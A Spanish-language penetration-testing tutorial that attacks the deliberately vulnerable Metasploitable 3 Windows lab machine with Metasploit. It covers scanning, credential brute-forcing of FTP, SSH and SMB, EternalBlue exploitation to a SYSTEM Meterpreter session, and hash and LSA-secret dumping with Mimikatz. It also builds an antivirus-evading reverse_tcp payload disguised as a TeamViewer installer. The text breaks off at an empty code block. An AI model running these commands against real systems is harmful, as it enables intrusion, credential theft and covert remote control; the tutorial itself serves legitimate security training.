
# Metasploit - Atacando Windows

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a sistemas Windows, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo.
{% endhint %}

## <mark style="color:purple;">Tutorial completo</mark>

{% embed url="<https://youtu.be/Z_tXuyz_O3s>" %}

## <mark style="color:purple;">Setup inicial</mark>

Vamos a atacar la máquina Metasploitable 3 Windows. Si no la tienes instalada en tu software de virtualización puedes seguir los pasos en esta sección:

{% content-ref url="/pages/oeb7yCOm8SMjwlcBGuRB" %}
[Metasploitable 3](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/metasploitable-3.md)
{% endcontent-ref %}

### Modo de red

* Tenemos que poner tanto la máquina Metasploitable como nuestro Kali Linux en modo `bridged` para poder conectarnos desde Kali como una máquina dentro de la misma red.&#x20;
* Una vez hecho esto comprobamos la conectividad desde nuestro Kali Linux:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ ping 192.168.1.185
</strong>
PING 192.168.1.185 (192.168.1.185) 56(84) bytes of data.
64 bytes from 192.168.1.185: icmp_seq=1 ttl=128 time=1.88 ms
64 bytes from 192.168.1.185: icmp_seq=2 ttl=128 time=1.13 ms
64 bytes from 192.168.1.185: icmp_seq=3 ttl=128 time=0.900 ms
64 bytes from 192.168.1.185: icmp_seq=4 ttl=128 time=0.742 ms
</code></pre>

### Conectar base de datos de Metasploit

```bash
sudo service postgresql status   # Status de postgresql
sudo systemctl start postgresql  # Iniciar la base de datos postgresql
sudo msfdb init                  # Iniciar la base de datos msfdb
sudo msfdb status                # Status de la base de datos msfdb
sudo msfdb run                   # Conectarse a la base de datos msfdb
```

Esto nos lanzará Metasploit con la base de datos habilitada.

***

## <mark style="color:purple;">Escaneo de puertos e importación</mark>

Habría 2 formas de importar hosts, puertos abiertos y vulnerabilidades en Metasploit:

* Importando un archivo de escaneo con nmap o Nessus
* Usando `db_nmap` directamente con Metasploit

### Importar escaneo de Nessus en Metasploit

Desde Nessus le damos a exportar escaneo. Esto nos guarda un reporte en formato `.nessus`.

```bash
sudo msfdb run
db_import /home/kali/escaneo.nessus
```

### Importar escaneo de Nmap en Metasploit

```bash
nmap -v -sV --script vuln -oX metasploitable_win.xml 192.168.1.185
```

```bash
sudo msfdb run
db_import metasploitable_win.xml
```

### Escaneando puertos con Metasploit

Podemos usar Nmap directamente desde msfconsole. Para escanear directamente desde la consola sin tener que pasar a segundo plano o salir del proceso, use el comando `db_nmap`.

```bash
msf6 > db_nmap -v -sV --script vuln 192.168.1.185

[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 13:34 UTC
[*] Nmap: NSE: Loaded 151 scripts for scanning.
[*] Nmap: NSE: Script Pre-scanning.
[*] Nmap: Nmap scan report for 192.168.1.185
[*] Nmap: Host is up (0.0012s latency).
[*] Nmap: Not shown: 982 filtered tcp ports (no-response)
[*] Nmap: PORT      STATE SERVICE       VERSION
[*] Nmap: 21/tcp    open  ftp           Microsoft ftpd
[*] Nmap: 22/tcp    open  ssh           OpenSSH 7.1 (protocol 2.0)
[*] Nmap: 80/tcp    open  http          Microsoft IIS httpd 7.5
[*] Nmap: |_http-csrf: Couldn't find any CSRF vulnerabilities.
[*] Nmap: |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
[*] Nmap: |_http-server-header: Microsoft-IIS/7.5
[*] Nmap: |_http-dombased-xss: Couldn't find any DOM based XSS'.
[*] Nmap: 135/tcp   open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3306/tcp  open  mysql         MySQL 5.5.20-log
[*] Nmap: 3389/tcp  open  ms-wbt-server Microsoft Terminal Service
[*] Nmap: |_ssl-ccs-injection: No reply from server (TIMEOUT)
[*] Nmap: 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: |_http-dombased-xss: Couldn't find any DOM based XSS.
[*] Nmap: |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
[*] Nmap: |_http-csrf: Couldn't find any CSRF vulnerabilities.
[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0


msf6 > hosts     # Nos muestra los host
msf6 > services  # Nos muestra los servicios corriendo
msf6 > vulns     # Nos muestra las vulnerabilidades encontradas
msf6 > creds     # Nos muestra las credenciales obtenidas o crackeadas
```

Vamos a analizar la información obtenida.

***

## <mark style="color:purple;">**Analizar resultados**</mark>

La base de datos no solo almacena información, sino que también te permite usarla en tus ataques:

### Hosts

```bash
msf6 > hosts

Hosts
=====

address        mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------  ---------  -----  -------  ----  --------
192.168.1.185             Unknown                    device
```

### Servicios

```bash
msf6 > services
Services
========

host           port   proto  name           state  info
----           ----   -----  ----           -----  ----
192.168.1.185  21     tcp    ftp            open   Microsoft ftpd
192.168.1.185  22     tcp    ssh            open   OpenSSH 7.1 protocol 2.0
192.168.1.185  80     tcp    http           open   Microsoft IIS httpd 7.5
192.168.1.185  135    tcp    msrpc          open   Microsoft Windows RPC
192.168.1.185  139    tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
192.168.1.185  445    tcp    microsoft-ds   open   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
192.168.1.185  3306   tcp    mysql          open   MySQL 5.5.20-log
192.168.1.185  3389   tcp    ms-wbt-server  open   Microsoft Terminal Service
192.168.1.185  5985   tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
192.168.1.185  8009   tcp    ajp13          open   Apache Jserv Protocol v1.3
192.168.1.185  8080   tcp    http           open   Sun GlassFish Open Source Edition  4.0
192.168.1.185  8181   tcp    ssl/http       open   Sun GlassFish Open Source Edition  4.0
192.168.1.185  8383   tcp    http           open   Apache httpd
192.168.1.185  9200   tcp    elasticsearch  open   Elastic elasticsearch 1.1.1
192.168.1.185  49152  tcp    msrpc          open   Microsoft Windows RPC
192.168.1.185  49154  tcp    msrpc          open   Microsoft Windows RPC
192.168.1.185  49155  tcp    msrpc          open   Microsoft Windows RPC
192.168.1.185  49176  tcp    java-rmi       open   Java RMI
```

Con estos datos ya podríamos buscar exploits para estos servicios.

***

## <mark style="color:purple;">Atacando Metasploitable</mark>

### Configurar host global

Con la variable <kbd>`setg`</kbd> podemos indicarle un `RHOST` (la máquina objetivo) y un `LHOST` (nuestra máquina Kali Linux) lo guardará de manera global para todos los exploits que queramos probar contra esta máquina:

```bash
msf6 > setg RHOST 192.168.1.185     # Máquina objetivo
msf6 > setg LHOST 192.168.1.191     # Nuestro Kali Linux
```

Vamos a crear 2 wordlists con los usuarios existentes en la máquina y los password conocidos para explotar esta máquina, con el objetivo de hacer fuerza bruta a distintos servicios: users.txt y pass.txt

{% code title="users.txt" %}

```
administrator
vagrant
```

{% endcode %}

{% code title="pass.txt" %}

```
administrator
vagrant
```

{% endcode %}

Además estas 2 wordlists las podríamos añadir también como variables globales para usarlas con los módulos de fuerza bruta de FTP, SSH, SMB, etc... Lo podemos hacer de la siguiente manera:

```bash
msf6 > setg user_file users.txt
msf6 > setg pass_file pass.txt
```

{% hint style="info" %}
Estas wordlists se podrían sustituir por listas más extensas como el diccionario Rockyou o algún diccionario de las Seclists, pero como conocemos los 2 usuarios y la contraseña lo haremos así para este ejemplo.
{% endhint %}

***

## <mark style="color:purple;">Atacando FTP</mark>

Vamos a hacer bruteforce a distintos servicios de la máquina con los módulos propios de Metasploit, ya que de esa manera si consigue credenciales válidas podríamos verlas rápidamente con el comando `creds`.&#x20;

Para hacer bruteforce del servicio FTP vamos a usar el módulo módulo `ftp_login`:

```bash
msf6 auxiliary(scanner/ftp/ftp_login) > run

[*] 192.168.1.185:21      - 192.168.1.185:21 - Starting FTP login sweep
[-] 192.168.1.185:21      - 192.168.1.185:21 - LOGIN FAILED: administrator:administrator (Incorrect: )
[+] 192.168.1.185:21      - 192.168.1.185:21 - Login Successful: administrator:vagrant
[-] 192.168.1.185:21      - 192.168.1.185:21 - LOGIN FAILED: vagrant:administrator (Incorrect: )
[+] 192.168.1.185:21      - 192.168.1.185:21 - Login Successful: vagrant:vagrant
[*] 192.168.1.185:21      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Tenemos 2 usuarios, por lo que vamos a probar a conectarnos por SSH como administrator:

```bash
ftp 192.168.1.185

Connected to 192.168.1.185.
220 Microsoft FTP Service
Name (192.168.1.185:kali): administrator
331 Password required for administrator.
Password: vagrant
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49284|)
125 Data connection already open; Transfer starting.
03-19-23  02:17AM       <DIR>          aspnet_client
03-19-23  02:06AM                   28 caidao.asp
03-19-23  02:06AM                34251 hahaha.jpg
03-19-23  02:06AM              1116928 index.html
03-19-23  02:06AM              2439511 seven_of_hearts.html
03-19-23  02:06AM               384916 six_of_diamonds.zip
03-19-23  02:17AM               184946 welcome.png
226 Transfer complete.
ftp> 
```

Conseguimos acceso por FTP con ambos usuarios y podríamos tanto descargarnos los archivos como subir archivos maliciosos.

## <mark style="color:purple;">Atacando SSH</mark>

Vamos a hacer bruteforce del servicio SSH con el módulo `ssh_login`:

```bash
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.168.1.185:22 - Starting bruteforce
[+] 192.168.1.185:22 - Success: 'vagrant:vagrant' 'Microsoft Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 Build 7601'
[*] SSH session 1 opened (192.168.1.192:45093 -> 192.168.1.185:22) at 2025-01-26 16:10:03 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
ssh vagrant@192.168.1.185
vagrant@192.168.1.185's password: vagrant

-sh-4.3$ ls
AppData
Application Data
Contacts
Cookies
Desktop
Documents
Downloads
Favorites
Links
Local Settings
Music
My Documents
NTUSER.DAT
```

Conseguimos acceder por SSH con el usuario vagrant

***

## <mark style="color:purple;">Atacando SMB</mark>

Vamos a explotar el servicio SMB, y como es una máquina antigua vamos a comprobar si la máquina es vulnerable a EternalBlue:

### Explotación manual

```bash
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 192.168.1.185:445     - 192.168.1.185:445 - Starting SMB login bruteforce
[-] 192.168.1.185:445     - 192.168.1.185:445 - Failed: '.\administrator:administrator',
[+] 192.168.1.185:445     - 192.168.1.185:445 - Success: '.\administrator:vagrant' Administrator
[-] 192.168.1.185:445     - 192.168.1.185:445 - Failed: '.\vagrant:administrator',
[+] 192.168.1.185:445     - 192.168.1.185:445 - Success: '.\vagrant:vagrant' Administrator
[*] 192.168.1.185:445     - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.1.185:445     - Bruteforce completed, 2 credentials were successful.
```

Tenemos 2 usuarios válidos, por lo que vamos a listar los recursos compartidos:

```bash
smbmap -H 192.168.1.185 -u Administrator -p vagrant

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                  [*] Detected 1 hosts serving SMB
[|] Initializing hosts...                                       [/] Initializing hosts...                                                                               [-] Authenticating...                                                                                   [*] Established 1 SMB connections(s) and 1 authenticated session(s)
[\] Authenticating...                                           [|] Enumerating shares...      
                                                                         [/] Enumerating shares...                                                                                                                                                                                   
[+] IP: 192.168.1.185:445	Name: 192.168.1.185       	Status: ADMIN!!!   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C$                                                	READ, WRITE	Default share
	IPC$                                              	NO ACCESS	Remote IPC
```

Accdemos a los recursos compartidos en ADMIN$:

```bash
mbclient //192.168.1.185/ADMIN$ -U administrator 
Password for [WORKGROUP\administrator]: vagrant
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 14:52:20 2025
  ..                                  D        0  Sun Jan 26 14:52:20 2025
  AppCompat                           D        0  Tue Jul 14 03:20:08 2009
  AppPatch                            D        0  Sun Nov 21 03:31:48 2010
  assembly                          DSR        0  Sun Mar 19 10:22:18 2023
  bfsvc.exe                           A    71168  Sun Nov 21 03:24:24 2010
  Boot                                D        0  Tue Jul 14 03:20:09 2009
  bootstat.dat                       AS    67584  Sun Jan 26 14:13:02 2025
  Branding                            D        0  Tue Jul 14 05:37:10 2009
  Cursors                             D        0  Tue Jul 14 03:20:09 2009
  debug                               D        0  Tue Jul 14 04:56:52 2009
  diagerr.xml                         A     1908  Sun Mar 19 10:01:36 2023
<----SNIP---->
```

### Explotación automática

Como es una máquina antigua, lo más normal es que sea vulnerable a `EternalBlue`, una vulnerabilidad crítica en el protocolo SMB de Microsoft, identificada oficialmente como CVE-2017-0144. Descubierta por la Agencia de Seguridad Nacional de Estados Unidos (NSA) y filtrada por el grupo de hackers Shadow Brokers, EternalBlue explotó esta falla permitiendo a atacantes remotos ejecutar código malicioso en sistemas Windows afectados sin autenticación previa.&#x20;

#### Comprobación

Para ver si la máquina es vulnerable podemos usar ese módulo:

```bash
use auxiliary/scanner/smb/smb_ms17_010

msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[+] 192.168.1.185:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.185:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Explotación

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.185
set LHOST 192.168.1.191

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.192:4444 
[*] 192.168.1.185:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.185:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.185:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.185:445 - The target is vulnerable.
[*] 192.168.1.185:445 - Connecting to target for exploitation.
[+] 192.168.1.185:445 - Connection established for exploitation.
[+] 192.168.1.185:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.185:445 - CORE raw buffer dump (51 bytes)
[*] 192.168.1.185:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.1.185:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 192.168.1.185:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 192.168.1.185:445 - 0x00000030  6b 20 31                                         k 1             
[+] 192.168.1.185:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.185:445 - Trying exploit with 15 Groom Allocations.
[*] 192.168.1.185:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.185:445 - Starting non-paged pool grooming
[+] 192.168.1.185:445 - Sending SMBv2 buffers
[+] 192.168.1.185:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.185:445 - Sending final SMBv2 buffers.
[*] 192.168.1.185:445 - Sending last fragment of exploit packet!
[*] 192.168.1.185:445 - Receiving response from exploit packet
[+] 192.168.1.185:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.185:445 - Sending egg to corrupted connection.
[*] 192.168.1.185:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.1.185
[*] Meterpreter session 2 opened (192.168.1.192:4444 -> 192.168.1.185:49471) at 2025-01-26 15:32:10 +0000
[+] 192.168.1.185:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.185:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.185:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Tenemos un [Meterpreter](/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/meterpreter.md) como SYSTEM. Desde este punto podríamos llevarnos la session al background para ejecutar un exploit suggester que nos permitiría identificar otros exploits interesantes en la máquina:

```bash
meterpreter > bg
[*] Backgrounding session 2...
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VAGRANT-2008R  192.168.1.192:4444 -> 192.168.1.185
                                     2                                    :49471 (192.168.1.185)
```

***

## <mark style="color:purple;">Exploit Suggester</mark>

El Exploit Suggester de Metasploit es una herramienta post-explotación diseñada para identificar posibles vulnerabilidades adicionales en el sistema objetivo. Después de abrir una sesión, típicamente con Metasploit usando un exploit como EternalBlue, se puede ejecutar el módulo Local Exploit Suggester.&#x20;

Este módulo revisa una variedad de exploits conocidos que podrían aplicarse al sistema de destino, basándose en características como la versión del sistema operativo y el software instalado. El objetivo es sugerir exploits locales que el usuario puede utilizar para escalar privilegios, obtener acceso más profundo o persistir en el sistema comprometido. Esto permite maximizar el control sobre el sistema atacado y posiblemente descubrir nuevas debilidades que no fueron explotadas en la fase inicial de penetración.

```bash
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 2
SESSION => 2
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 192.168.1.185 - Collecting local exploits for x64/windows...
[*] 192.168.1.185 - 198 exploit checks are being tried...
[+] 192.168.1.185 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 192.168.1.185 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 192.168.1.185 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 192.168.1.185 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
```

```bash
[*] Running check method for exploit 47 / 47
[*] 192.168.1.185 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 5   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

Podríamos probar todos estos script contra la máquina objetivo

***

## <mark style="color:purple;">Usando Meterpreter</mark>

Ya que tenemos una sesión abierta de Meterpreter en la máquina, vamos a volver a la sesión para enumerar cosas interesantes:

```
msf6 > sessions 2
meterpreter >
```

{% hint style="warning" %}
En caso de no tener una sesión de Meterpreter en la máquina, pero sí una shell normal, podemos actualizar la shell a Meterpreter con el comando: `sessions -u <session>`
{% endhint %}

### Ver información de usuario y equipo

Podemos usar `getuid` y `sysinfo` para obtener información sobre nuestro usuario actual y sobre el equipo:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : VAGRANT-2008R2
OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

Si no tuvieramos permisos de administrador podríamos intentar elevar nuestros privilegios directamente con `getsystem`:

```bash
meterpreter > getsystem
[-] Already running as SYSTEM
```

### Hashdump

Desde Meterpreter con privilegios SYSTEM podemos hacer un volcado de todos los hashes de los usuarios del sistema con `hashdump`:

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
anakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
artoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
ben_kenobi:1009:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
boba_fett:1014:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
chewbacca:1017:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
c_three_pio:1008:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
darth_vader:1010:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
greedo:1016:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
han_solo:1006:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
jabba_hutt:1015:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
jarjar_binks:1012:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
kylo_ren:1018:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
lando_calrissian:1013:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
leia_organa:1004:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
luke_skywalker:1005:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
```

### Importar Mimikatz

Desde Meterpreter también podemos importar Mimikatz con `load kiwi` para extraer aún más información:

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

### Dumpeo de SAM desde Mimikatz

```bash
meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : VAGRANT-2008R2
SysKey : 8ffb5d14e764926d830f87d7205ebdd6
Local SID : S-1-5-21-2010520603-3385233033-3932565385

SAMKey : 7278260a000be1a9cbcb0b5c02b9346e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e02bc503339d51f71d913c245d35b50b

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : vagrant
  Hash NTLM: e02bc503339d51f71d913c245d35b50b

RID  : 000003e9 (1001)
User : sshd

RID  : 000003ea (1002)
User : sshd_server
  Hash NTLM: 8d0a16cfc061c3359db455d00ec27035

RID  : 000003ec (1004)
User : leia_organa
  Hash NTLM: 8ae6a810ce203621cf9cfa6f21f14028

RID  : 000003ed (1005)
User : luke_skywalker
  Hash NTLM: 481e6150bde6998ed22b0e9bac82005a
```

### Dumpeo de LSA Secrets desde Mimikatz

```bash
meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : VAGRANT-2008R2
SysKey : 8ffb5d14e764926d830f87d7205ebdd6

Local name : VAGRANT-2008R2 ( S-1-5-21-2010520603-3385233033-3932565385 )
Domain name : WORKGROUP

Policy subsystem is : 1.11
LSA Key(s) : 1, default {dbf10c12-f8ea-bf04-443a-8893b6b5b4b1}
  [00] {dbf10c12-f8ea-bf04-443a-8893b6b5b4b1} ee94018fa1d57d76dc78e35d2566302e2b504ad01a927d87a8a687bd5f51f84d

Secret  : DefaultPassword
cur/text: vagrant
old/text: ROOT#123

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 27 e9 16 62 b2 5b 10 0d 13 e5 ab 60 3e f4 16 ef 69 1b 93 b9 f1 bf bb 62 0a 9d ca 37 f1 75 6b e5 55 ce ed a6 e9 45 e2 db 
    full: 27e91662b25b100d13e5ab603ef416ef691b93b9f1bfbb620a9dca37f1756be555ceeda6e945e2db
    m/u : 27e91662b25b100d13e5ab603ef416ef691b93b9 / f1bfbb620a9dca37f1756be555ceeda6e945e2db
old/hex : 01 00 00 00 ec 9c 9a 9f 35 c7 df f8 1a 13 9c 54 91 ea ec 30 3c 72 7d 50 fa 4e 31 1e 10 87 88 66 31 82 e4 0f 7d 0e d7 27 17 7b 8a 2c 
    full: ec9c9a9f35c7dff81a139c5491eaec303c727d50fa4e311e108788663182e40f7d0ed727177b8a2c
    m/u : ec9c9a9f35c7dff81a139c5491eaec303c727d50 / fa4e311e108788663182e40f7d0ed727177b8a2c

Secret  : NL$KM
cur/hex : f5 cc 34 52 38 23 2f 57 fb e2 16 50 b5 b3 f9 85 9c 7a 57 4e 2d 0a 6f b7 d9 79 4a 69 10 0d bc 9b 6e 38 c9 9a 13 13 32 b6 18 02 04 5c be d9 11 13 55 05 17 27 3b d4 4f 81 9d de ae 0c 2a 48 19 2c 

Secret  : _SC_OpenSSHd / service 'OpenSSHd' with username : .\sshd_server
cur/text: D@rj33l1ng
```

***

## <mark style="color:purple;">Explotación con Msfvenom</mark>

Vamos a ver otro caso de uso con el que podemos explotar una máquina Windows creando un payload con Msfvenom que nos devuelva un Meterpreter a un listener Multi Handler en Metasploit.

{% content-ref url="/pages/TlXO5KvukiJrW7DmNLjK" %}
[Msfvenom](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/msfvenom.md)
{% endcontent-ref %}

### Crear payload con Msfvenom

Vamos a crear un payload que pueda eludir antivirus aplicando una codificación `Shikata Ga Nai` y con un nombre que pueda pasar desapercibido en el sistema objetivo:

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.191 LPORT=4444 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: ./TeamViewerInstall.exe
```

{% hint style="info" %}
Vamos a utilizar la arquitectura `x86` porque es un sistema antiguo, pero para sistemas Windows modernos deberíamos especificar la arquitectura `x64`
{% endhint %}

También podemos automatizar este proceso con MSF Build, un script en python que nos genera automáticamente el ejecutable con la codificación `Shikata Ga Nai`:

{% embed url="<https://github.com/afsh4ck/MSF-Build/tree/main>" %}

### Abrir listener Multi Handler

Como nos vamos a devolver una conexión con Meterpreter, necesitamos usar un listener que lo acepte. Para ello vamos a usar el módulo multi/handler de Metasploit:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <NUESTRA_IP>
set LPORT 4444
exploit
```

{% hint style="warning" %}
**Importante**: Debemos `seleccionar manualmente` el payload que hemos usado en Msfvenom o el Multi Handler no recibirá la conexión de Meterpreter. En nuestro caso usamos windows/meterpreter/reverse\_tcp
{% endhint %}

También puedes ejecutar todos esos comandos en una sola línea en la terminal de Kali Linux utilizando `&&` para encadenar los comandos en `msfconsole`:

```bash
